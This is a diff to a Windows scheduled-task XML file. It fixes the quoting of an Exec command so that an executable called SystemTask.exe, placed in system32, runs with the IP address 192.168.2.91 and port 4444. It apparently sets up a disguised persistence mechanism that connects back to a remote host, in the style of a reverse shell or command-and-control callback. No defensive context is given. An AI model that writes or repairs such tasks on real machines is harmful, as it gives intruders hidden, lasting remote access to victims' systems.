@@ -38,7 +38,7 @@
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>"C:\Windows\system32\SystemTask.exe 192.168.2.91 4444"</Command>
+      <Command>C:\Windows\system32\SystemTask.exe 192.168.2.91 4444</Command>
     </Exec>
   </Actions>
 </Task>
